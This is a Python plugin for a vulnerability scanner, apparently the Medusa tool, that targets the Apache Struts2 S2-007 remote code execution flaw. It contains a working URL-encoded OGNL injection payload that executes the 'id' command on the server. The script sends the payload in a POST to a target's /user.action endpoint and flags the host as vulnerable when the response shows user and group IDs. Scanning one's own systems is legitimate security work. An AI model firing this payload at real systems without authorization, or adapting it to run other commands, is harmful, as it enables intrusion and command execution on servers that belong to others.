#!/usr/bin/env python
# _*_ coding: utf-8 _*_

import urllib
import requests

import logging
import ClassCongregation
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2019-10-13"  # 插件编辑时间
        self.info['algroup'] = "S2_007"  # 插件名称
        self.info['name'] ='Struts2远程代码执行漏洞' #漏洞名称
        self.info['affects'] = "Struts2"  # 漏洞组件
        self.info['desc_content'] = ""  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
        self.info['details'] = Medusa  # 结果



def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payload='''
name=111&email=11&age=%27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29+%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%29+%2B+%27'''
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    payload_url = scheme+"://"+url+':'+str(port)+'/user.action'
    host=url+':'+str(port)
    headers = {
        'Host':host,
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'User-Agent': RandomAgent,
        'Connection': 'close',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '571',
        'DNT': '1',
        'Referer':payload_url,
        'Upgrade-Insecure-Requests': '1'
    }
    s = requests.session()
    try:
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = s.post(payload_url, data=payload, headers=headers, proxies=proxies ,timeout=5, verify=False)

        elif ProxyIp==None:
            resp = s.post(payload_url, data=payload,headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if code==200 and con.lower().find('uid')!=-1 and con.lower().find('gid')!=-1 and con.lower().find('groups')!=-1:
            Medusa = "{} \r\n漏洞详情:\r\n影响版本:2_0_0-2_2_3\r\nPayload:{}\r\nPost:{}\r\n".format(url, payload_url,payload)
            _t = VulnerabilityInfo(Medusa)
            web = ClassCongregation.VulnerabilityDetails(_t.info)
            web.High()  # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
            return (_t.info)
    except:
        logging.warning(Url)
        _ = VulnerabilityInfo('')
        logging.warning(_.info.get('parameter'))
